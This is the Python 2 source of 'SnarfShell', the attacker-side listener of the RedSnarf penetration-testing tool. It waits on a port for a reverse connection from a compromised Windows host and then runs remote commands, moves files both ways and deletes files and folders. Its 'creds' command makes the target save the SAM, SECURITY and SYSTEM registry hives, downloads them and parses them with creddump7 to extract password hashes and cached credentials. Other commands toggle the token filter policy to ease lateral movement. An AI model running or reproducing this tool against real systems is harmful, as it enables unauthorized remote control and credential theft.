#! /usr/bin/python

from termcolor import colored 
import os, socket, subprocess, signal

def banner():
    print """
    ______           .____________                     _____  
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
        \/     \/     \/       \/     \/     \/                      
                                  redsnarf.ff0000@gmail.com
                                                  @redsnarf
"""
    print colored("\nE D Williams - NCCGroup",'red')
    print colored("R Davy - NCCGroup\n",'red')


progs = ['cachedump','lsadump']
creddump7path="/opt/creddump7/"

#Routine handles Crtl+C
def signal_handler(signal, frame):
        print colored("\n[!]Ctrl+C pressed.. aborting...",'red')
        sys.exit()

def upload(s,path,command):
    #print path
    s.send(command)
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(4096)
        print colored("[+]Sending data",'yellow')
        while packet != '':
            s.send(packet) 
            packet = f.read(4096)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('[-]Unable to find out the file')

    print colored("[+]File uploaded to cwd on remote machine",'green')

def transfer(conn,command,filename,remoteip):
    
    downloadpth="/tmp/"+remoteip+"/"

    if not os.path.isdir(downloadpth):
        proc = subprocess.Popen("mkdir "+downloadpth, stdout=subprocess.PIPE,shell=True)
        stdout_value = proc.communicate()[0]

    conn.send(command)
    f = open(downloadpth+filename,'wb')
    while True:  
        bits = conn.recv(4096)
        if 'Unable to find out the file' in bits:
            print colored('[-]Unable to find out the file..','red')
            break
        if bits.endswith('DONE'):
            print colored('[+]Download complete..','green')
            #f.write(bits[0:len(bits)-4])
            f.close()
            break
        f.write(bits)

def connect():
    try:
        banner()

        ipaddress=raw_input("[+]Enter the IP address you wish to listen on (default 0.0.0.0): ")
        port=raw_input("[+]Enter the Port you wish to listen on (default 4444): ")

        if ipaddress=="":
            ipaddress="0.0.0.0"

        if port=="":
            port="4444"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ipaddress, int(port)))
        s.listen(1)
        
        print colored('[+]Listening on '+ ipaddress +':'+port,'yellow')
        conn, addr = s.accept()
        print colored('[+]We have a connection from: '+ str(addr),'green')

        while True:       
            command = raw_input("SnarfShell> ")
            #Close the connection properly
            if command=='quit':
                conn.send('quit')
                conn.close() 
                break
            elif 'download' in command: 
                #Get the file name from the download string and pass to transfer                              
                file=command.split('\\')
                #Try and transfer file
                print file[len(file)-1]
                transfer(conn,command,file[len(file)-1],str(addr[0]))
            elif 'help' in command:
                #Offer some basic help information
                print colored("[+]RedSnarf Basic Shell:",'red')
                print colored("[?]Available Commands:",'yellow')
                print "\tenable_lat - enable local access token filter policy"
                print "\tdisable_lat - disable local access token filter policy"
                print "\tcreds - dump sam/security/system from remote to local machine"
                print "\tdownload*pathtofile - download file from remote to local machine"
                print "\tupload*pathtofile - upload file from local machine to cwd on remote machine"
                print "\tcd - change directory"
                print "\tnet - windows net command"
                print "\tdir - windows dir command"
                print "\tmkdir - create a new directory"
                print "\trmdir - delete a directory and all files/folders within"
                print "\tdel - delete file"
                print "\t*LinuxCommandHere - run linux commands on local machine"
                print "\tquit - close connection"
                print colored("\nMost native Commands Work if not sure - give it a try!\n",'yellow')
                pass
            
            elif command=='creds':
                
                #Generate Files on Remote Machine
                print colored("[+]Sending command to generate c:\sam, c:\system, c:\security",'green')
                conn.send('creds')
                
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print data

                #Download the files to local machine
                print colored("[+]Download c:\sam",'yellow')
                transfer(conn,"download*c:\sam","sam",str(addr[0]))
                print colored("[+]Download c:\security",'yellow')
                transfer(conn,"download*c:\security","security",str(addr[0]))
                print colored("[+]Download c:\system",'yellow')
                transfer(conn,"download*c:\system","system",str(addr[0]))
                
                #Clean Up Files on Remote Machine
                conn.send('creds_cleanup')
                
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print data

                #Parse the files locally
                if os.path.exists("/tmp/"+str(addr[0])+"/"):
                    print colored("\n\n[+]Parsing SAM/SECURITY/SYSTEM with CredDump 7",'yellow')
                    print colored("[+]Using pwdump: "+str(addr[0]),'green')
                    if os.path.exists(creddump7path+"pwdump.py"):
                        os.system(creddump7path+"pwdump.py "+"/tmp/"+str(addr[0])+"/system "+"/tmp/"+str(addr[0])+"/sam | tee "+"/tmp/"+str(addr[0])+"/pwdump")

                    for p in progs:
                        try:
                            print colored("[+]Using "+p+": "+str(addr[0]) ,'green')
                            if os.path.exists(creddump7path+p+".py"):
                                os.system(creddump7path+p+".py "+"/tmp/"+str(addr[0])+"/system "+"/tmp/"+str(addr[0])+"/security true | tee "+"/tmp/"+str(addr[0])+"/"+p+"")
                        except OSError:
                            print colored("[-]Something went wrong extracting from "+p,'red')
                        if os.stat("/tmp/"+str(addr[0])+"/cachedump").st_size == 0:
                            print colored("[-]No cached creds for: "+str(addr[0]),'yellow')
            elif 'upload' in command:
                #Looks like we're going to download something
                       
                grab,path = command.split('*')
                try:                          
                    upload(conn,path,command)
                except Exception,e:
                    s.send ( str(e) )
                    pass

            elif command=='enable_lat':
                
                print colored("[+]Enabling Local Access Token Filter Policy",'green')
                conn.send('enable_lat')
                
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print data

            elif command=='disable_lat':
                
                print colored("[+]Disabling Local Access Token Filter Policy",'green')
                conn.send('disable_lat')
                
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print data

            elif command[0:1]=='*':
                #Run Linux Command
                os.system(command[1:len(command)])
            
            else:
                #Send Any other Commands               
                conn.send(command) 
                
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print data

    except Exception,e:
        #Todo Improve Error Messaging
        print colored("[!]"+str(e),'red')
    except OSError,f:
        print colored("[!]"+str(f),'red')

def main ():
    signal.signal(signal.SIGINT, signal_handler)
    connect()
main()











